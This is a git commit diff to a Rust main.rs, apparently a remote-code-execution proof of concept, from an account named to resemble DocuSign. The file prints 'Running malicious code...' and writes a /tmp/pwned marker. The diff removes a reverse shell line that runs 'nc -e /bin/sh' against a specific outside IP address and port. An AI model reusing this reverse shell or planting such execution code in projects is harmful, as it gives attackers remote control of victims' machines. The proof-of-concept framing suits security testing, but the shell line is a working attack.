336b841917e7a954ca10715887d17770b96cce15
docusigndev19099 <77848348+docusingndev112@users.noreply.github.com>
2025-03-30 11:26:40 +0530

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,14 +1,9 @@
+use std::fs;
 use std::process::Command;
 
 fn main() {
     println!("Running malicious code...");
 
-    // Example: Write a file as a proof
-    std::fs::write("/tmp/pwned", "You have been hacked!").unwrap();
-
-    // Example: Reverse shell (replace with your IP and port)
-    let _ = Command::new("sh")
-        .arg("-c")
-        .arg("nc -e /bin/sh 103.160.106.201 5050")
-        .spawn();
+    // Create a proof-of-execution file
+    let _ = fs::write("/tmp/pwned", "PoC RCE successful!");
 }
